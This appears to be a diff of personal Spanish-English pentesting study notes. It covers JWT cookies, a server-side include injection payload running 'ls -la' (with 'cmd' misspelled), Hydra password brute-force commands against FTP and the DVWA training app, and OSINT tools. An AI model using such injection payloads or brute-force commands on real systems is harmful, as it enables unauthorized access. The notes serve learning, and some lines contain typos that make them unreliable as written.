@@ -9,7 +9,7 @@ Para las cookies en NODE, usar jwt--> tokens de javascipt, token =  (header,body
 <https://tudominio.com/que-es-una-url-canonica> --> can be useful
 
 @@@@@@@@@@@@ RAROOOOOO INYECCION SSI ---------------
-
+	para archivos por ejemplo pagina.httml.sh
 	<!--#exec cdm="ls -la"-->
 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -52,3 +52,10 @@ bypass -->> saltarse el paso de seguridad
 	hydra -L user.txt -P pass.txt 192.168.1.108 ftp
 	hydra -l JhonMilton66 -P pass.txt 192.168.1.108 ftp
 hydra -l admin -P /root/Desktop/wordlists/test.txt dvwa http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username"
+
+
+
+
+OSINT --->Open source intelligence
+robtex
+domaintools
